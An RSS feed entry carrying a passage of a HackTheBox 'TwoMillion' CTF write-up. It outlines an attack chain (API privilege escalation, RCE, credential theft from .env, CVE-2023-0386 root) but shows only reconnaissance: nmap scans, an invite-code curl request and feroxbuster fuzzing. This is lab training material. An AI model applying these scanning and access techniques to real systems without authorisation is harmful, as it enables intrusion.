@@ -1,0 +1,511 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Php on</title><link>https://h4r1337.github.io/tags/php/</link><description>Recent content in Php on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 26 Jul 2023 21:58:49 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/php/index.xml" rel="self" type="application/rss+xml"/><item><title>TwoMillion | HackTheBox</title><link>https://h4r1337.github.io/posts/two-million/</link><pubDate>Wed, 26 Jul 2023 21:58:49 +0530</pubDate><guid>https://h4r1337.github.io/posts/two-million/</guid><description>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/TwoMillion">TwoMillion&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Makers&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/31190">&lt;img src="https://www.hackthebox.com/badge/image/31190" alt="" style="display: unset">&lt;/a>&lt;br>&lt;br>&lt;a href="https://app.hackthebox.com/users/114053">&lt;img src="https://www.hackthebox.com/badge/image/114053" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About TwoMillion
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>In this easy linux machine we will face the classic hackthebox invite challenge that is required to be solved by the users to register a new account. We will generate the invite code and create a new account then escalate to the admin role by manipulating some api misconfigurations which leads to the access of a new api endpoint with rce vulnerability. We will exploit the rce to gain access to the system and read admin user credentials from the &lt;code>.env&lt;/code> file. We then privesc to root by exploiting &lt;strong>&lt;code>CVE-2023-0386&lt;/code>&lt;/strong> and read the final root flag.&lt;/p></description><content>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/TwoMillion">TwoMillion&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Makers&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/31190">&lt;img src="https://www.hackthebox.com/badge/image/31190" alt="" style="display: unset">&lt;/a>&lt;br>&lt;br>&lt;a href="https://app.hackthebox.com/users/114053">&lt;img src="https://www.hackthebox.com/badge/image/114053" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About TwoMillion
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>In this easy linux machine we will face the classic hackthebox invite challenge that is required to be solved by the users to register a new account. We will generate the invite code and create a new account then escalate to the admin role by manipulating some api misconfigurations which leads to the access of a new api endpoint with rce vulnerability. We will exploit the rce to gain access to the system and read admin user credentials from the &lt;code>.env&lt;/code> file. We then privesc to root by exploiting &lt;strong>&lt;code>CVE-2023-0386&lt;/code>&lt;/strong> and read the final root flag.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
+&lt;p>Scan all open TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> nmap -p- -T4 --min-rate &lt;span style="color:#d3869b">10000&lt;/span> 10.10.11.221 -oA nmap/ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Starting Nmap 7.80 &lt;span style="color:#fe8019">(&lt;/span> https://nmap.org &lt;span style="color:#fe8019">)&lt;/span> at 2023-07-25 16:21 IST
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> 10.10.11.221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#fe8019">(&lt;/span>0.27s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#d3869b">65499&lt;/span> filtered ports, &lt;span style="color:#d3869b">34&lt;/span> closed ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap &lt;span style="color:#fe8019">done&lt;/span>: &lt;span style="color:#d3869b">1&lt;/span> IP address &lt;span style="color:#fe8019">(&lt;/span>&lt;span style="color:#d3869b">1&lt;/span> host up&lt;span style="color:#fe8019">)&lt;/span> scanned in 40.02 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Further scan the open ports with default script and service scan flags:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> nmap -p22,80 -sC -sV 10.10.11.221 -oA nmap/service
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Starting Nmap 7.80 &lt;span style="color:#fe8019">(&lt;/span> https://nmap.org &lt;span style="color:#fe8019">)&lt;/span> at 2023-07-25 16:24 IST
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> 10.10.11.221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#fe8019">(&lt;/span>0.66s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http nginx
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Did not follow redirect to http://2million.htb/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap &lt;span style="color:#fe8019">done&lt;/span>: &lt;span style="color:#d3869b">1&lt;/span> IP address &lt;span style="color:#fe8019">(&lt;/span>&lt;span style="color:#d3869b">1&lt;/span> host up&lt;span style="color:#fe8019">)&lt;/span> scanned in 20.33 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/service-scan.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s add the domain name to the &lt;code>/etc/hosts&lt;/code> file.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> sudo &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;10.10.11.221 2million.htb&amp;#34;&lt;/span> &amp;gt;&amp;gt; /etc/hosts
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now scan the port 80 again to see if anything changes:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> nmap -p80 -sC -sV 10.10.11.221 -oA nmap/http
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Starting Nmap 7.80 &lt;span style="color:#fe8019">(&lt;/span> https://nmap.org &lt;span style="color:#fe8019">)&lt;/span> at 2023-07-25 16:39 IST
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> 2million.htb &lt;span style="color:#fe8019">(&lt;/span>10.10.11.221&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#fe8019">(&lt;/span>0.32s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http nginx
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-cookie-flags:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| /:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| PHPSESSID:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ httponly flag not &lt;span style="color:#fabd2f">set&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Hack The Box :: Penetration Testing Labs
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-trane-info: Problem with XML parsing of /evox/about
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap &lt;span style="color:#fe8019">done&lt;/span>: &lt;span style="color:#d3869b">1&lt;/span> IP address &lt;span style="color:#fe8019">(&lt;/span>&lt;span style="color:#d3869b">1&lt;/span> host up&lt;span style="color:#fe8019">)&lt;/span> scanned in 16.26 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Nothing interesting&amp;hellip;&lt;/p>
+&lt;hr>
+&lt;h3 id="port-80---http-nginx">Port 80 - HTTP (Nginx)&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/port-80.webp">&lt;/figure>
+&lt;p>As I said earlier, in order to register a new account we have to solve this challenge:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/htb-invite-challenge.webp">&lt;/figure>
+&lt;p>I will be going through the challenge without detailed explanation assuming that you guys know the stuff already.&lt;/p>
+&lt;h4 id="generate-invite-code">Generate invite code:&lt;/h4>
+&lt;p>Send a post request to &lt;code>/api/v1/invite/generate&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> curl -XPOST &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/invite/generate&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The code is encoded in base64 you can either decode it using &lt;code>base64 -d&lt;/code> or be more cool and use &lt;a href="https://jqlang.github.io/jq/">&lt;code>jq&lt;/code>&lt;/a> instead. We can use the &lt;code>@base64d&lt;/code> format string to decode base64 encoding.&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>-r&lt;/code> flag is used to get raw output of the filter (i.e. without quotes)&lt;/li>
+&lt;li>&lt;code>.data.code&lt;/code> is used to get the value of &lt;code>code&lt;/code> inside &lt;code>data&lt;/code>&lt;/li>
+&lt;li>we then pipe the output into &lt;code>@base64d&lt;/code> format string to decode the base64 value&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> curl -XPOST &lt;span style="color:#b8bb26">&amp;#39;http://2million.htb/api/v1/invite/generate&amp;#39;&lt;/span> --silent | jq -r &lt;span style="color:#b8bb26">&amp;#39;.data.code | @base64d&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>2SLRO-WDS71-6ECIA-BTIJ5
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/invite-generate.webp">&lt;/figure>
+&lt;p>Now using this invite code we can register a new account and check the functionalities.&lt;/p>
+&lt;h4 id="fuzzing-time">Fuzzing time:&lt;/h4>
+&lt;p>I am using &lt;a href="https://github.com/epi052/feroxbuster">Feroxbuster&lt;/a> and dirsearch wordlist for a quick scan:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> feroxbuster -u http://2million.htb/ --no-recursion --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ___ ___ __ __ __ __ __ ___
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|__ |__ |__&lt;span style="color:#fe8019">)&lt;/span> |__&lt;span style="color:#fe8019">)&lt;/span> | / &lt;span style="color:#b8bb26">`&lt;/span> / &lt;span style="color:#b8bb26">\ \_&lt;/span>/ | | &lt;span style="color:#b8bb26">\ &lt;/span>|__
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| |___ | &lt;span style="color:#b8bb26">\ &lt;/span>| &lt;span style="color:#b8bb26">\ &lt;/span>| &lt;span style="color:#b8bb26">\_&lt;/span>_, &lt;span style="color:#b8bb26">\_&lt;/span>_/ / &lt;span style="color:#b8bb26">\ &lt;/span>| |__/ |___
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>by Ben &lt;span style="color:#b8bb26">&amp;#34;epi&amp;#34;&lt;/span> Risher 🤓 ver: 2.7.3
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>───────────────────────────┬──────────────────────
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🎯 Target Url │ http://2million.htb/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🚀 Threads │ &lt;span style="color:#d3869b">50&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 📖 Wordlist │ /usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 👌 Status Codes │ &lt;span style="color:#fe8019">[&lt;/span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500&lt;span style="color:#fe8019">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 💥 Timeout &lt;span style="color:#fe8019">(&lt;/span>secs&lt;span style="color:#fe8019">)&lt;/span> │ &lt;span style="color:#d3869b">7&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🦡 User-Agent │ feroxbuster/2.7.3
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 💉 Config File │ /home/h4r1337/.config/feroxbuster/ferox-config.toml
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🏁 HTTP methods │ &lt;span style="color:#fe8019">[&lt;/span>GET&lt;span style="color:#fe8019">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🚫 Do Not Recurse │ &lt;span style="color:#fabd2f">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>───────────────────────────┴──────────────────────
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🏁 Press &lt;span style="color:#fe8019">[&lt;/span>ENTER&lt;span style="color:#fe8019">]&lt;/span> to use the Scan Management Menu™
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>──────────────────────────────────────────────────
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WLD GET 7l 11w 162c Got &lt;span style="color:#d3869b">301&lt;/span> &lt;span style="color:#fe8019">for&lt;/span> http://2million.htb/39a396fcdf9146a789798c2d83ce42ec &lt;span style="color:#fe8019">(&lt;/span>url length: 32&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WLD - - - http://2million.htb/39a396fcdf9146a789798c2d83ce42ec &lt;span style="color:#fe8019">=&lt;/span>&amp;gt; http://2million.htb/404
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WLD GET - - - Wildcard response is static; auto-filtering &lt;span style="color:#d3869b">162&lt;/span> responses; toggle this behavior by using --dont-filter
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WLD GET 7l 11w 162c Got &lt;span style="color:#d3869b">301&lt;/span> &lt;span style="color:#fe8019">for&lt;/span> http://2million.htb/e4a3055cc9a64e0bb20aacb1d4ae37ffb441b4c8fcf5452f9ab15d4b36d50eda7b7fbd4b1d82425c95406f6fd304e83c &lt;span style="color:#fe8019">(&lt;/span>url length: 96&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WLD - - - http://2million.htb/e4a3055cc9a64e0bb20aacb1d4ae37ffb441b4c8fcf5452f9ab15d4b36d50eda7b7fbd4b1d82425c95406f6fd304e83c &lt;span style="color:#fe8019">=&lt;/span>&amp;gt; http://2million.htb/404
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">200&lt;/span> GET 1242l 3326w 0c http://2million.htb/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">200&lt;/span> GET 46l 152w 0c http://2million.htb/404
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">401&lt;/span> GET 0l 0w 0c http://2million.htb/api
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">403&lt;/span> GET 7l 9w 146c http://2million.htb/assets/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">403&lt;/span> GET 7l 9w 146c http://2million.htb/controllers/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">403&lt;/span> GET 7l 9w 146c http://2million.htb/css/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">403&lt;/span> GET 7l 9w 146c http://2million.htb/fonts/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">302&lt;/span> GET 0l 0w 0c http://2million.htb/home &lt;span style="color:#fe8019">=&lt;/span>&amp;gt; http://2million.htb/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">403&lt;/span> GET 7l 9w 146c http://2million.htb/images/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">200&lt;/span> GET 96l 285w 0c http://2million.htb/invite
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">403&lt;/span> GET 7l 9w 146c http://2million.htb/js/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">302&lt;/span> GET 0l 0w 0c http://2million.htb/logout &lt;span style="color:#fe8019">=&lt;/span>&amp;gt; http://2million.htb/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">200&lt;/span> GET 1242l 3326w 0c http://2million.htb/views/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">[&lt;/span>&lt;span style="color:#928374;font-style:italic">####################] - 1m 13193/13193 0s found:15 errors:0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">[&lt;/span>&lt;span style="color:#928374;font-style:italic">####################] - 1m 13195/13193 182/s http://2million.htb/&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/fuzzing.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s check further inside the &lt;code>/api&lt;/code> endpoint using some specific wordlists from &lt;a href="https://github.com/danielmiessler/SecLists.git">seclists&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span> feroxbuster -u http://2million.htb/api/ --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ___ ___ __ __ __ __ __ ___
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|__ |__ |__&lt;span style="color:#fe8019">)&lt;/span> |__&lt;span style="color:#fe8019">)&lt;/span> | / &lt;span style="color:#b8bb26">`&lt;/span> / &lt;span style="color:#b8bb26">\ \_&lt;/span>/ | | &lt;span style="color:#b8bb26">\ &lt;/span>|__
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| |___ | &lt;span style="color:#b8bb26">\ &lt;/span>| &lt;span style="color:#b8bb26">\ &lt;/span>| &lt;span style="color:#b8bb26">\_&lt;/span>_, &lt;span style="color:#b8bb26">\_&lt;/span>_/ / &lt;span style="color:#b8bb26">\ &lt;/span>| |__/ |___
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>by Ben &lt;span style="color:#b8bb26">&amp;#34;epi&amp;#34;&lt;/span> Risher 🤓 ver: 2.7.3
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>───────────────────────────┬──────────────────────
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🎯 Target Url │ http://2million.htb/api/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🚀 Threads │ &lt;span style="color:#d3869b">50&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 📖 Wordlist │ /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 👌 Status Codes │ &lt;span style="color:#fe8019">[&lt;/span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500&lt;span style="color:#fe8019">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 💥 Timeout &lt;span style="color:#fe8019">(&lt;/span>secs&lt;span style="color:#fe8019">)&lt;/span> │ &lt;span style="color:#d3869b">7&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🦡 User-Agent │ feroxbuster/2.7.3
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 💉 Config File │ /home/h4r1337/.config/feroxbuster/ferox-config.toml
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🏁 HTTP methods │ &lt;span style="color:#fe8019">[&lt;/span>GET&lt;span style="color:#fe8019">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🔃 Recursion Depth │ &lt;span style="color:#d3869b">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>───────────────────────────┴──────────────────────
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 🏁 Press &lt;span style="color:#fe8019">[&lt;/span>ENTER&lt;span style="color:#fe8019">]&lt;/span> to use the Scan Management Menu™
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>──────────────────────────────────────────────────
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WLD GET 7l 11w 162c Got &lt;span style="color:#d3869b">301&lt;/span> &lt;span style="color:#fe8019">for&lt;/span> http://2million.htb/api/5030f00dc2f645de8293e52d19e06e72 &lt;span style="color:#fe8019">(&lt;/span>url length: 32&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WLD - - - http://2million.htb/api/5030f00dc2f645de8293e52d19e06e72 &lt;span style="color:#fe8019">=&lt;/span>&amp;gt; http://2million.htb/404
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WLD GET - - - Wildcard response is static; auto-filtering &lt;span style="color:#d3869b">162&lt;/span> responses; toggle this behavior by using --dont-filter
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WLD GET 7l 11w 162c Got &lt;span style="color:#d3869b">301&lt;/span> &lt;span style="color:#fe8019">for&lt;/span> http://2million.htb/api/fb7fa5e4ff13410d890e539d08e9ddab5934e9af97514708acd99ccc463694dbb32a685eae8f4ef69d7f71ae7d95fe2f &lt;span style="color:#fe8019">(&lt;/span>url length: 96&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WLD - - - http://2million.htb/api/fb7fa5e4ff13410d890e539d08e9ddab5934e9af97514708acd99ccc463694dbb32a685eae8f4ef69d7f71ae7d95fe2f &lt;span style="color:#fe8019">=&lt;/span>&amp;gt; http://2million.htb/404
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d3869b">401&lt;/span> GET 0l 0w 0c http://2million.htb/api/v1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">[&lt;/span>&lt;span style="color:#928374;font-style:italic">####################] - 18s 3133/3133 0s found:3 errors:0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">[&lt;/span>&lt;span style="color:#928374;font-style:italic">####################] - 17s 3135/3133 174/s http://2million.htb/api/&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It&amp;rsquo;s showing &lt;code>401&lt;/code> so we need an account to view that any way:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/two-million/api-v1.webp">&lt;/figure>
+&lt;p>The &lt;code>/api/v1&lt;/code> list outs all the available api endpoints and we can see that there&amp;rsquo;s an endpoint to update admin settings &lt;code>/api/v1/admin/settings/update&lt;/code>. Let&amp;rsquo;s see what it does.&lt;/p>
